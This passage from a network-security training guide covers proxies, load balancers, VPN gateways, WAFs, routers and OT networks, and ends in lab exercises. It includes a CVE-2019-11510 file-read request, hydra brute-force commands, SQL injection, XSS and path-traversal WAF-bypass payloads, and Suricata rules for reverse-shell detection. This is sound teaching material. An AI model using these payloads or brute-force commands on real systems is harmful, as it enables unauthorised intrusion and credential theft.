    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options DENY always;
    add_header X-Content-Type-Options nosniff always;
    
    # Rate limiting
    limit_req zone=api burst=20 nodelay;
    
    # Proxy to backend
    location / {
        proxy_pass http://backend_servers;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        
        # Don't expose backend server information:
        proxy_hide_header Server;
        proxy_hide_header X-Powered-By;
    }
    
    # Block common attack paths:
    location ~* \.(php|asp|aspx|jsp)$ {
        deny all;   # Block if using Node.js backend (no PHP expected)
    }
}
```

**Transparent Proxy:**

A transparent proxy intercepts traffic without client knowledge or configuration. Used by:
- ISPs for caching
- Corporate networks for content filtering even when clients aren't configured to use proxy
- Attackers with MITM position (evil twin AP, ARP poisoning)

```bash
# Detect if you're behind a transparent proxy:
curl -v http://httpbin.org/ip        # Real IP vs what the server sees
curl http://httpbin.org/headers      # Check for X-Forwarded-For header
# If server sees different IP than your own: you're behind proxy/NAT

# Detect proxy headers revealing internal infrastructure:
curl -v https://target.com/
# Look for: Via, X-Cache, X-Forwarded-For, X-Real-IP headers
# These can reveal: proxy software, backend server IPs, CDN details
```

> **Key Insight:** Forward proxies are among the most effective controls for preventing malware C2 communication — if all outbound traffic must traverse the proxy, malware that makes direct TCP connections is blocked. But sophisticated malware uses HTTPS to legitimate cloud services (GitHub, Google, Slack, Microsoft) as dead-drops, evading even TLS-inspecting proxies. The proxy logs are still valuable for detection — unusual patterns to legitimate domains are detectable with behavioural analysis.

---

## 7. Load Balancers

### 7.1 What Load Balancers Do

A load balancer distributes incoming network traffic across multiple backend servers to:
- Prevent any single server from being overwhelmed
- Provide redundancy (if one server fails, others handle traffic)
- Enable horizontal scaling (add servers to increase capacity)

```
LOAD BALANCER OPERATION:

Internet → [Load Balancer: 203.0.113.1] → Web Server 1 (192.168.10.1)
                                        → Web Server 2 (192.168.10.2)
                                        → Web Server 3 (192.168.10.3)

Client sees: one IP (203.0.113.1)
Actual servers: distributed load across backend pool

Load balancing algorithms:
  Round Robin:    Requests distributed sequentially: 1,2,3,1,2,3...
  Least Connections: Send to server with fewest active connections
  IP Hash:       Same client IP always goes to same server (session persistence)
  Weighted:      Servers assigned different traffic proportions (based on capacity)
  Random:        Random server selection
  Health-based:  Only route to healthy servers (monitors backend health)
```

### 7.2 Load Balancer Security Implications

**TLS Termination:**

```
Many load balancers terminate TLS:
  Client → [HTTPS] → Load Balancer → [HTTP] → Backend servers

Security implications:
  Positive:
    - Certificate management centralised at load balancer
    - Backend servers don't need TLS processing overhead
    - Load balancer can inspect HTTP content before forwarding
    
  Negative:
    - Traffic between load balancer and backend: unencrypted
    - If backend network is compromised: all traffic readable
    - Load balancer holds private keys: high-value target
    
Solution: TLS re-encryption (end-to-end TLS)
  Client → [HTTPS] → Load Balancer → [HTTPS] → Backend
  More overhead but traffic encrypted throughout
```

**Load Balancer as Attack Vector:**

```bash
# Detect load balancer and identify backend servers:
# Method 1: Multiple requests, different server headers
for i in {1..10}; do curl -s -I https://target.com | grep -i "server:\|x-powered\|via:"; done
# Different responses = load balanced

# Method 2: Different Server header or response variations
curl -s -I https://target.com
curl -s -I https://target.com
# If "Server: Apache/2.4.51" then "Server: nginx/1.18.0" → different backends

# Method 3: Direct IP access (bypasses load balancer)
# If backend IP discovered (via DNS history, SSL cert SAN, subdomain enumeration):
curl -H "Host: target.com" https://BACKEND_IP/
# May bypass WAF/load balancer security → direct attack surface

# Method 4: Load balancer vendor identification
nmap --script http-headers target.com | grep -i "x-amz\|x-forwarded\|x-envoy\|f5\|haproxy"
# X-Amz-*: AWS Application Load Balancer
# X-Envoy-*: Istio/Envoy (Kubernetes)
# F5-TrafficShield: F5 BIG-IP
```

**Session Persistence and Security:**

```
"Sticky sessions" (IP hash or cookie-based):
  Same client always routed to same backend server
  Required for stateful applications that don't share session state
  
Security issue:
  If attacker can predict or control the session cookie:
  They can force their requests to specific backend servers
  Enables targeted attacks against specific backend if one is more vulnerable
  
Cookie-based persistence attack:
  Load balancer inserts cookie: BIGipServerPool=1234...
  This reveals: load balancer type (BIG-IP), server ID, pool name
  Attackers use this to map backend infrastructure
  
Solution: Encrypt persistence cookies, use opaque session IDs
```

> **Key Insight:** Load balancers are high-value targets because they sit in front of all traffic and often hold TLS private keys. Compromising a load balancer means decrypting all HTTPS traffic, bypassing WAF rules, and directly accessing backend servers without going through security controls. Always apply the same security standards (patching, hardening, monitoring) to load balancers as to the servers they protect.

---

## 8. VPN Gateways

### 8.1 VPN Types and Their Security Profiles

**Site-to-Site VPN:**
Connects two networks permanently. Traffic between the networks flows through an encrypted tunnel. Users are unaware.

```
Branch Office                    Corporate HQ
192.168.2.0/24 ──[VPN GW]──[Internet]──[VPN GW]── 10.0.0.0/8

All traffic from 192.168.2.0/24 to 10.0.0.0/8:
  → Encrypted in IPSec tunnel
  → Decrypted at HQ VPN gateway
  → Delivered to destination
```

**Remote Access VPN:**
Individual users connect to the corporate network from anywhere. Requires VPN client software.

```
Remote User → [Internet] → [VPN Gateway] → Corporate Network
  Tunnel: IPSec, OpenVPN, WireGuard, SSL VPN
  User assigned: internal IP from VPN address pool
  DNS: corporate DNS for resolution
  Split tunnel: only corporate traffic through VPN, internet direct
  Full tunnel: ALL traffic through VPN (more secure, more load)
```

### 8.2 VPN Protocols

```
IPSec (IKEv2 + ESP):
  Standard: RFC 4306 (IKEv2), RFC 4303 (ESP)
  Ports: UDP 500 (IKE), UDP 4500 (NAT-traversal)
  Encryption: AES-256-GCM typically
  Authentication: certificates, pre-shared key (PSK)
  Use: Enterprise, site-to-site, mobile clients
  
OpenVPN:
  Standard: Custom protocol over TLS
  Ports: UDP 1194 (default), can be TCP 443 (firewall bypass)
  Encryption: OpenSSL (AES-256-CBC, AES-256-GCM)
  Authentication: certificates, username/password, MFA
  Use: Remote access, privacy VPNs, flexibility
  Advantage: TCP 443 mode makes VPN traffic look like HTTPS
  
WireGuard:
  Standard: Modern, minimal (~4,000 lines of code vs OpenVPN's 70,000+)
  Port: UDP 51820
  Encryption: ChaCha20-Poly1305, Curve25519
  Authentication: Public key only (no certificate infrastructure)
  Performance: Fastest VPN protocol available (in-kernel on Linux)
  Security: Smaller codebase = smaller attack surface
  
SSL VPN (clientless):
  Access via HTTPS in browser — no client software
  Uses portal to proxy access to internal resources
  Easier to deploy than IPSec for remote users
  Examples: Pulse Secure, Citrix Gateway, Palo Alto GlobalProtect
```

### 8.3 VPN Security Vulnerabilities — A Critical Attack Surface

VPN gateways have been a primary target for sophisticated threat actors. The attack pattern: compromise VPN gateway → gain pre-authentication access to internal network → maintain persistent access.

```
Pulse Secure VPN (CVE-2019-11510, 2019):
  CVSS: 10.0
  Unauthenticated arbitrary file read
  Read: /etc/passwd, VPN session cookies, authentication logs
  Attackers used to steal: 7,000+ VPN credentials from companies
  APT41 (Chinese group) actively exploited
  Still used in 2021: NSA advisory warned of ongoing exploitation
  
Citrix ADC/Gateway (CVE-2019-19781, 2020):
  CVSS: 9.8
  Path traversal → RCE without credentials
  Tens of thousands of devices vulnerable
  Multiple APT groups and ransomware operators exploited

Pulse Secure (again, CVE-2021-22893):
  Zero-day exploited before patch available
  Mandiant reported exploitation by UNC2630 and UNC2717 (suspected Chinese APT)
  Victims: US Defence Industrial Base, European companies
  
Fortinet SSL-VPN (CVE-2022-42475, 2022):
  Heap buffer overflow → RCE
  Chinese APT Volt Typhoon used similar Fortinet vulnerabilities for initial access
  into US critical infrastructure

F5 BIG-IP (CVE-2023-46747, 2023):
  Authentication bypass → RCE
  CVSS: 9.8
  Active exploitation within days of disclosure
  
Common thread: VPN gateways are always-on, internet-facing, and handle authentication.
They are the keys to the kingdom, so attackers prioritise them.
```

**VPN Security Assessment:**

```bash
# Identify VPN software and version (banner grabbing):
curl -sk https://vpn.target.com/ | grep -iE "version|product|ssl-vpn|fortinet|pulse|citrix"

# Check for known vulnerable VPN pages:
# Pulse Secure: /dana-na/auth/url_default/welcome.cgi
# Fortinet: /remote/login
# Citrix: /vpn/index.html

curl -sk https://vpn.target.com/dana-na/auth/url_default/welcome.cgi | head -20

# Test for CVE-2019-11510 (Pulse Secure file read):
curl -sk "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"
# If returns /etc/passwd content: vulnerable

# Enumerate valid VPN usernames (some VPNs respond differently):
hydra -L users.txt -P /dev/null vpn.target.com -s 443 https-form-post \
    "/dana-na/auth/url_default/login.cgi:username=^USER^&password=^PASS^:F=Login failed"

# WireGuard port scan:
sudo nmap -sU -p 51820 target_ip
# No response or ICMP unreachable: may be WireGuard (it doesn't respond to unauthenticated packets)

# Split tunnel detection (from inside VPN):
ip route show                        # If default route through VPN: full tunnel
# If only corporate ranges through VPN: split tunnel
# Security difference: split tunnel → internet traffic bypasses corporate monitoring
```

**VPN Kill Switch:**

```bash
# Configure firewall to block all traffic if VPN disconnects:
# This prevents traffic from leaking unencrypted if VPN drops

# Linux iptables kill switch:
# Default: drop all outbound
iptables -P OUTPUT DROP
iptables -P INPUT DROP
iptables -P FORWARD DROP

# Allow loopback:
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Allow VPN interface when established:
iptables -A INPUT -i tun0 -j ACCEPT
iptables -A OUTPUT -o tun0 -j ACCEPT

# Allow VPN connection establishment:
iptables -A OUTPUT -p udp --dport 1194 -j ACCEPT    # OpenVPN
iptables -A OUTPUT -p udp --dport 51820 -j ACCEPT   # WireGuard
iptables -A INPUT -p udp --sport 1194 -j ACCEPT

# Now: if VPN drops, ALL traffic blocked — no leaks
# Only resumes when VPN reconnects and tun0 comes back up
```

> **Key Insight:** VPN gateways are the most frequently exploited initial access vector used by sophisticated nation-state actors and ransomware groups in the 2020s. The pattern is consistent: pre-auth vulnerability in VPN → foothold inside network → lateral movement → impact. Patching VPN gateways and monitoring their authentication logs deserves the highest priority of any internet-facing system.

---

## 9. WAF — Web Application Firewall

### 9.1 What a WAF Does and How

A WAF operates at Layer 7, specifically for HTTP/HTTPS traffic. Unlike a network firewall that filters based on IPs and ports, a WAF inspects the HTTP request and response content.

```
WAF INSPECTION POINTS:

Incoming HTTP request:
  ├── URL path (/../../etc/passwd → path traversal blocked)
  ├── Query string (?id=1 UNION SELECT → SQL injection blocked)
  ├── HTTP headers (User-Agent, Cookie, Referer)
  ├── Request body (POST data, JSON, XML)
  └── File uploads (malicious file type/content blocked)

Outgoing HTTP response:
  ├── Credit card patterns (PCI-DSS requirement)
  ├── Social Security numbers
  ├── Error messages revealing internal paths/version info
  └── Sensitive data patterns

WAF Position:
  Client → [WAF] → Web Application
  WAF can: BLOCK (return 403), ALERT, MODIFY (sanitise input), LOG
```

### 9.2 WAF Detection Methods

**Positive Security Model (Whitelist):**
Define what valid requests look like. Everything else is blocked. Extremely effective but requires significant effort to define valid request profiles. Used for critical, well-defined APIs.

**Negative Security Model (Blacklist):**
Define known attack patterns. Everything not matching is allowed. Easier to deploy. Misses novel attacks. Most commercial WAFs use this as default.

**Machine Learning:**
Learns "normal" request patterns from traffic. Flags statistical anomalies. Effective for detecting novel attacks and reducing false positives.

### 9.3 WAF Bypass Techniques

Understanding WAF bypass is essential both for penetration testers (demonstrating that a WAF is insufficient protection alone) and for defenders (improving WAF rules).

```bash
# WAF detection:
wafw00f https://target.com           # Identify WAF type
# Output: Detected: Cloudflare, AWS WAF, Imperva, F5 ASM, etc.

# SQLmap WAF bypass options:
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment
# --tamper options:
#   space2comment: replace spaces with /**/
#   between: add BETWEEN comparisons
#   charencode: URL encode characters
#   base64encode: encode in base64
#   apostrophemask: replace ' with %EF%BC%87

# Manual SQL injection WAF bypass techniques:
# Standard (blocked): ' UNION SELECT 1,2,3--
# Bypass variants:
' /*!UNION*/ /*!SELECT*/ 1,2,3--         # MySQL comment bypass
' UNION%20SELECT 1,2,3--                  # URL encoding
' UNION%09SELECT 1,2,3--                  # Tab instead of space
' UNION(SELECT 1,2,3)--                   # Parentheses
' UniOn SeLeCt 1,2,3--                    # Mixed case (some WAFs are case-sensitive)
' UNION SELECT NULL,NULL,NULL--           # NULL values (avoid type issues)

# XSS WAF bypass:
# Standard (blocked): <script>alert(1)</script>
# Bypass variants:
<img src=x onerror=alert(1)>              # Different tag
<svg onload=alert(1)>                     # SVG
<iframe srcdoc="<script>alert(1)</script>"> # Nested
javascript:alert(1)                       # Protocol
<SCRIPT>alert(1)</SCRIPT>                # Uppercase
<scr<script>ipt>alert(1)</scr</script>ipt> # Double nested
alert`1`                                  # Template literal (no parens)
eval(atob('YWxlcnQoMSk='))              # Base64 encoded

# Path traversal WAF bypass:
# Standard (blocked): ../../../etc/passwd
# Bypass:
....//....//....//etc/passwd             # Double encoding
..%2F..%2F..%2Fetc/passwd                # URL encoded slash
..%252F..%252Fetc/passwd                 # Double URL encoded
%2e%2e/%2e%2e/etc/passwd                 # Encoded dots
```

**WAF Architecture Attacks:**

```bash
# Origin server bypass:
# Many WAFs protect public IP, but backend may be directly accessible

# Find origin IP behind WAF:
# Method 1: Historical DNS records
curl "https://securitytrails.com/domain/target.com/history/a"
# Method 2: DNS history tools
host target.com 8.8.8.8              # Current IP
# Check: Shodan, Censys, for origin IP matching content fingerprint

# Method 3: Subdomain enumeration
# Often: api.target.com, origin.target.com, direct.target.com bypass WAF

# Method 4: Certificate transparency logs reveal subdomains
curl "https://crt.sh/?q=%25.target.com&output=json" | python3 -m json.tool | grep name_value

# Once origin IP found:
curl -H "Host: target.com" http://ORIGIN_IP/
# WAF is bypassed — direct attack on application
```

> **Key Insight:** A WAF is not a substitute for secure application development. It is a compensating control that raises the bar for attackers — but every WAF can be bypassed given sufficient time and creativity. The true value of a WAF is reducing the effectiveness of automated attack tools and script kiddies, logging attack attempts for intelligence, and buying time to patch vulnerabilities. Applications must be secure at the code level; WAF is the defence-in-depth layer, not the primary defence.

---

## 10. Modem vs Router

### 10.1 The Physical Connection to the Internet

**Modem (Modulator-Demodulator):**
Converts between the digital signals your network uses and the signal type of your internet connection medium (phone line, cable, fibre, cellular).

```
DSL Modem:   Digital data ↔ Analogue phone line signal (ADSL, VDSL)
Cable Modem: Digital data ↔ DOCSIS cable signal (coax)
Fibre ONT:   Digital data ↔ Optical fibre (PON - Passive Optical Network)
4G/5G Modem: Digital data ↔ Radio frequency cellular signal
```

The modem handles the physical and data link layer conversion. It typically does NOT perform routing, NAT, or firewalling in its pure form.

**Router:**
Routes IP packets between networks. In home/SOHO contexts, typically performs:
- NAT (sharing one ISP IP among multiple devices)
- DHCP server (assigns IPs to local devices)
- Basic stateful firewall (blocks unsolicited inbound)
- DNS forwarding
- Wi-Fi access point (if combined device)

### 10.2 The Combined Device — Gateway

What most people call a "router" at home is actually a combined device:
- Modem (converts ISP signal)
- Router (NAT, routing)
- Firewall (basic stateful)
- DHCP server
- DNS forwarder
- Wi-Fi access point

These "home gateway" devices are extremely common attack targets.

```
Home Gateway Security Issues:

1. Default credentials:
   admin/admin, admin/password, admin/1234, user/user
   Many users never change them
   Shodan shows millions of home routers with default creds accessible
   
2. UPnP enabled by default:
   Applications can automatically open firewall rules
   Malware exploits UPnP to create persistent inbound access
   Disable UPnP on all home/SOHO routers
   
3. Remote management exposed:
   HTTP/HTTPS management accessible from internet
   Allows brute force and exploitation from anywhere
   Should be: disabled, or restricted to LAN-only
   
4. Outdated firmware:
   Home routers rarely receive automatic updates
   Vulnerabilities persist for years
   
5. DNS-over-WAN attacks:
   DNS rebinding attacks through router
   
Real-world impact:
   Mirai botnet (2016): compromised ~600,000 routers/IoT devices via
   default credentials, launched 1.2 Tbps DDoS
   VPNFilter (2018): sophisticated malware on 500,000 routers in 54 countries
   Used for: credential theft, network scanning, modifying web traffic
   Attributable to Sandworm (Russian GRU)
```

```bash
# Router security assessment:

# Identify router model from network:
nmap -O 192.168.1.1                    # OS detection
curl -s http://192.168.1.1/ | grep -iE "model|version|firmware|router"

# Check for common router admin panels:
for port in 80 443 8080 8443 8888; do
    curl -sk -o /dev/null -w "%{http_code}" http://192.168.1.1:$port/ && echo " port $port"
done

# Test default credentials (manual):
curl -s http://admin:admin@192.168.1.1/
curl -s http://admin:password@192.168.1.1/

# Check if remote management is enabled:
# Try accessing router from external perspective:
# (Use a different network or online scanner)
nmap -sV -p 80,443,8080,8443 EXTERNAL_ROUTER_IP

# Check for UPnP:
upnpc -l 2>/dev/null                   # List current UPnP port forwards
# Any entries: applications have opened holes in the firewall

# Shodan for your router:
# shodan host EXTERNAL_IP
# Shows services visible from internet — router panel should NOT appear

# Router CVE checking:
# Identify model from router admin page
# Search: nvd.nist.gov for model name
# Common vulnerable models: D-Link DIR-xxx, TP-Link Archer xxx, Netgear R-xxx
```

---

## 11. Network Device Security — Cross-Cutting Concerns

### 11.1 Default Credentials — The Universal Problem

Every network device ships with default credentials. Default credentials are:
- Published in vendor documentation (anyone can find them)
- Identical across all devices of the same model
- Almost never changed in OT/industrial environments
- The first thing every automated scanner tests

```bash
# Comprehensive default credential testing:

# For network devices, start with these:
# admin/admin, admin/password, admin/(blank), root/root, cisco/cisco
# administrator/administrator, operator/operator, user/user

# Router targets:
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.1.1/
# Or use default credential wordlists:
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv \
    http-get://192.168.1.1/

# SSH on network devices:
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt \
    ssh://192.168.1.1

# Databases of default credentials:
# https://www.default-password.info/
# https://www.fortypoundhead.com/tools_dpview.asp
# Seclists: /usr/share/seclists/Passwords/Default-Credentials/
```

### 11.2 Management Plane Hardening

All network devices have a management plane — the interface for configuration. This plane must be hardened separately from the data plane (traffic forwarding).

```
Management Plane Components:
  CLI: SSH (required), Telnet (must be DISABLED)
  Web: HTTPS (if used), HTTP (must be DISABLED)
  SNMP: v3 authPriv only (v1/v2c must be DISABLED)
  NETCONF/RESTCONF: over SSH/HTTPS (modern management)
  Syslog: send logs to remote server (for audit trail)
  NTP: synchronise time (for accurate log timestamps)

Hardening Checklist:
  ☐ Change all default passwords (minimum 16 characters, complex)
  ☐ Disable Telnet, HTTP, SNMP v1/v2c
  ☐ Enable SSH v2 only (disable SSHv1)
  ☐ Restrict management to specific source IPs (management VLAN only)
  ☐ Enable management access logging
  ☐ Configure SSH key-based authentication (disable password auth)
  ☐ Set session timeout (idle sessions auto-disconnect)
  ☐ Enable all relevant logging to remote syslog
  ☐ Enable NTP synchronisation
  ☐ Disable unused services (CDP, LLDP on untrusted ports, DTP)
  ☐ Apply latest firmware/patch
  ☐ Configure SNMP v3 authPriv (or disable if not used)
  ☐ Enable password encryption in configuration
```

```bash
# Cisco IOS hardening (key commands):

# Disable Telnet, enable SSH only:
! line vty 0 15
!   transport input ssh
!   exec-timeout 5 0           ← 5 minute idle timeout

# Enable SSH v2:
! ip ssh version 2
! crypto key generate rsa modulus 4096

# Set strong password and enable secret:
! enable algorithm-type sha256 secret StrongPassword123!
! username admin privilege 15 algorithm-type sha256 secret AdminPass456!

# Restrict management to specific IPs:
! ip access-list standard MGMT_HOSTS
!   permit 10.10.3.0 0.0.0.255    ← management VLAN only
!   deny any log

! line vty 0 15
!   access-class MGMT_HOSTS in

# Disable unneeded services:
! no ip http server              ← Disable HTTP management
! no ip http secure-server       ← Disable HTTPS management (if not needed)
! no cdp run                     ← Disable Cisco Discovery Protocol (if not needed)
! no service pad
! no ip finger
! no ip boot server
! no service dhcp                ← If not acting as DHCP server
```

### 11.3 Firmware Vulnerabilities and Patch Management

Network device firmware is software — it has bugs, and those bugs are vulnerabilities. The challenge:

```
Network Device Patching Challenges:

Production impact:
  Updating firmware requires device restart
  Restart = traffic interruption (seconds to minutes)
  Scheduled downtime required
  HA failover can mitigate but not eliminate

Testing requirement:
  Firmware updates can break existing configuration
  Must test on non-production before deploying
  
OT/ICS additional challenge:
  Industrial switches in substations: utility safety procedures required
  PLC firmware: vendor must validate every change
  Any change to OT system requires change management approval
  Timeline: months for some changes in critical OT environments
  
Result: 
  Network devices often run firmware that is years out of date
  Security teams know about vulnerabilities but cannot patch quickly
  
Compensating controls (when patching is delayed):
  - Network segmentation (limit who can reach management plane)
  - Firewall rules blocking access to vulnerable services
  - IPS signatures for specific CVEs
  - Enhanced monitoring for exploitation indicators
```

---

## 12. Network Devices in OT/ICS Environments

### 12.1 The OT Network Device Landscape

Industrial networks use the same classes of devices as enterprise IT, but with critical differences in capabilities, age, patching, and security features.

```
OT Network Device Reality (2024):

Managed switches: Present in modern OT networks
  - Typically: Cisco IE series, Hirschmann, Phoenix Contact, Moxa
  - Security features: often disabled for "operational simplicity"
  - SNMP: v1 or v2c commonly (v3 rarely configured)
  - Age: 5-15+ years in production environments

Unmanaged switches: Surprisingly common in process areas
  - No configuration, no VLANs, no port security, no monitoring
  - Equivalent to a hub from security perspective
  - Common justification: "it never needs maintenance"
  - Reality: complete blind spot in security monitoring

Industrial firewalls: Slowly increasing adoption
  - Tofino Industrial Firewall (now part of Honeywell)
  - Fortinet (FortiGate with OT/ICS profile)
  - Cisco IOS industrial with zone-based firewall
  - Schneider Electric ConneXium
  - Challenge: industrial protocols must be allowed, and most have no auth

Industrial DMZ architecture (reference):
  Corporate IT ──→ [IT Firewall] ──→ DMZ ──→ [OT Firewall] ──→ OT Network
                                     │
                              Historian (data aggregation)
                              Jump Server (operator access)
                              Anti-virus update server
                              Patch management server
```

### 12.2 Substation Network Architecture (Power Grid)

```
NERC CIP compliant substation (simplified):
                                         
  Corporate WAN                           
       │                                 
  [Corporate Firewall]                   
       │                                 
  [DMZ: SCADA Server, Historian]         
       │                                 
  [Substation Firewall]                  
       │                                 
  Substation LAN ─────────────────────────────────┐
  10.20.1.0/24                                     │
       │                         │                 │
  [IED Zone] GOOSE/MMS       [SCADA Zone]    [Engineering]
  Protection Relays          HMI Server      Workstation
  (IEC 61850)               (Wonderware)    (EWS)
       │
  [Physical Field Devices]
  Breakers, Transformers, Sensors

Key security controls:
  - Serial-to-Ethernet converters for legacy IEDs (RS-485/DNP3 → Ethernet/TCP)
  - GOOSE traffic: L2 multicast, cannot traverse router
  - Firewall between engineering zone and IED zone
  - All remote access through jump server in DMZ
  - NERC CIP-005: electronic security perimeter must be defined and enforced
```

### 12.3 OT-Specific Network Device Threats

**Unauthorised Remote Access:**
Many industrial network environments have unauthorised or forgotten remote access methods:
- Modems on serial ports (for vendor support, installed years ago, never removed)
- Cellular modems added "temporarily" for maintenance
- Personal Wi-Fi hotspots brought by field technicians
- TeamViewer or similar installed by vendors without documentation

**Flat OT Networks:**
A significant percentage of industrial networks have no segmentation between:
- HMI/SCADA servers
- PLCs and field devices
- Engineering workstations
- Historian servers
- Operator workstations

A ransomware infection of one Windows workstation can encrypt every other Windows system on the same flat network, and in many cases reach network-connected HMI servers.

**Switch Firmware in OT:**
Industrial managed switches (Hirschmann, Moxa) have their own vulnerabilities:

```
CVE-2022-38694 (Hirschmann HiOS Switches, 2022):
  Authentication bypass in web interface
  Remote code execution as root
  Affected: Switches used in substations and industrial facilities
  
CVE-2021-27730 (Moxa EDS Switches, 2021):
  Cross-site scripting in web management
  Stored XSS allows session hijacking
  
Multiple Cisco IE series switches (Industrial Ethernet):
  Various CVEs in web management, Cisco IOS vulnerabilities
  Patch frequency for industrial-grade Cisco: same as enterprise, but
  industrial customers often 12-24 months behind on patches
```

```bash
# OT network device discovery and assessment:

# Passive discovery (safe for production):
sudo tcpdump -i eth0 -n -q 2>/dev/null | awk '{print $3,$5}' | \
    grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort | uniq
# Collects IPs from traffic — non-invasive

# LLDP/CDP passive capture (reveals device details without scanning):
sudo tcpdump -i eth0 'ether proto 0x88cc' -v    # LLDP
sudo tcpdump -i eth0 'ether proto 0x2000' -v    # CDP
# Both reveal: device name, model, port, VLAN, IP address

# SNMP enumeration of switches (if community known):
snmpwalk -v2c -c public 10.20.1.1 1.3.6.1.2.1.1.1.0  # sysDescr
snmpwalk -v2c -c public 10.20.1.1 1.3.6.1.2.1.2.2     # Interface table
# Reveals: switch model, firmware version, all interfaces and their status

# Safe Nmap for OT (only if explicitly authorised):
sudo nmap -sn -T1 10.20.0.0/24     # Ping only, very slow (T1)
# -sn: no port scan (ping discovery only)
# -T1: sneaky timing (minimum network impact)
# Even this should be coordinated with operations team in OT environments
```

---

## 13. Hands-On Exercises

### Exercise 1: Switch MAC Table and ARP Interaction (30 minutes)

```bash
# Understand how switches and ARP interact

# 1. View your current ARP table:
arp -a                                  # Linux
ip neigh show                           # Modern Linux

# 2. View MAC table on a managed switch (if accessible via SNMP):
# If you have SNMP access to a switch on your lab:
snmpwalk -v2c -c public SWITCH_IP 1.3.6.1.2.1.17.4.3.1.2
# Returns: MAC addresses in the forwarding table

# 3. Capture ARP traffic and observe switch learning:
sudo tcpdump -i eth0 -n 'arp' -e     # -e shows MAC addresses
# Observe: Ethernet source MAC in ARP requests matches ARP sender MAC
# Switch learns these and builds CAM table from them

# 4. Simulate MAC flooding detection:
# On a test machine, generate many different source MACs:
python3 << 'EOF'
from scapy.all import *
import random

def random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])

# Send 100 frames with random source MACs
for i in range(100):
    pkt = Ether(src=random_mac(), dst="ff:ff:ff:ff:ff:ff") / \
          IP(dst="192.168.1.1") / ICMP()
    # sendp(pkt, iface="eth0", verbose=False)  # Uncomment to actually send
    print(f"Would send frame with src MAC: {pkt.src}")
    
print("(Sending disabled - this is a simulation)")
EOF
```

### Exercise 2: Firewall Rule Analysis (45 minutes)

```bash
# Analyse and audit iptables firewall rules

# 1. View current rules:
sudo iptables -L -n -v --line-numbers
sudo iptables -t nat -L -n -v

# 2. Test firewall behaviour:
# Create a test rule and verify it works:
sudo iptables -A INPUT -s 127.0.0.1 -p tcp --dport 9999 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 9999 -j DROP

# Start listener:
nc -l 9999 &

# Test from allowed source (localhost):
nc -zv localhost 9999            # Should succeed

# Test from other source (should be blocked):
# From another machine on the network:
# nc -zv THIS_MACHINE_IP 9999   # Should be blocked

# Clean up:
kill %1 2>/dev/null
sudo iptables -D INPUT -s 127.0.0.1 -p tcp --dport 9999 -j ACCEPT
sudo iptables -D INPUT -p tcp --dport 9999 -j DROP

# 3. Build a basic stateful firewall:
cat > /tmp/simple_firewall.sh << 'EOF'
#!/bin/bash
# Simple stateful firewall

# Flush existing rules:
iptables -F
iptables -X
iptables -t nat -F

# Default policies: DROP everything:
iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP

# Allow loopback:
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Allow established/related (stateful):
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow specific outbound:
iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT    # HTTP
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT   # HTTPS
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT    # DNS
iptables -A OUTPUT -p icmp -j ACCEPT               # Ping

# Allow specific inbound:
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT  # SSH

# Log dropped packets:
iptables -A INPUT -j LOG --log-prefix "DROPPED INPUT: " --log-level 6
iptables -A OUTPUT -j LOG --log-prefix "DROPPED OUTPUT: " --log-level 6

echo "Firewall rules applied"
iptables -L -n -v
EOF
chmod +x /tmp/simple_firewall.sh
# sudo bash /tmp/simple_firewall.sh  # Run to apply
```

### Exercise 3: IDS Rule Writing and Testing (1 hour)

```bash
# Write and test custom Suricata IDS rules

# Install Suricata if not present:
sudo apt install suricata -y

# Create test rules:
sudo cat > /etc/suricata/rules/bytewall-test.rules << 'EOF'
# Rule 1: Detect potential reverse shell over common ports
alert tcp $HOME_NET any -> $EXTERNAL_NET [4444,4445,5555,6666,7777,8888] \
    (msg:"BYTEWALL Potential Reverse Shell - Common Metasploit Port"; \
    flow:established,to_server; \
    threshold:type limit,track by_src,count 1,seconds 60; \
    sid:8000001; rev:1; classtype:trojan-activity;)

# Rule 2: Detect large ICMP packets (potential tunnel)
alert icmp any any -> any any \
    (msg:"BYTEWALL Large ICMP - Possible ICMP Tunnel"; \
    itype:8; dsize:>200; \
    sid:8000002; rev:1; classtype:policy-violation;)

# Rule 3: Detect base64 patterns in HTTP (potential encoded payload)
alert http any any -> $HTTP_SERVERS any \
    (msg:"BYTEWALL Base64 in HTTP URI"; \
    http.uri; content:"=="; \
    pcre:"/[A-Za-z0-9+\/]{50,}={1,2}/P"; \
    sid:8000003; rev:1; classtype:policy-violation;)

# Rule 4: Detect nmap scan signature
alert tcp any any -> $HOME_NET any \
    (msg:"BYTEWALL Possible Nmap Scan"; \
    flags:S; window:1024; \
    dsize:0; \
    sid:8000004; rev:1; classtype:network-scan;)
EOF

# Test rules against a PCAP file:
# Download test PCAP from Wireshark wiki or use tcpdump to capture
sudo tcpdump -i eth0 -w /tmp/test.pcap -c 1000 &
sleep 10
kill %1 2>/dev/null

sudo suricata -c /etc/suricata/suricata.yaml -r /tmp/test.pcap \
    -l /tmp/suricata_test/ --runmode=single

# View results:
cat /tmp/suricata_test/fast.log 2>/dev/null || echo "No alerts triggered"
cat /tmp/suricata_test/eve.json 2>/dev/null | python3 -m json.tool | head -50
```

### Exercise 4: VPN Configuration and Testing (45 minutes)

```bash
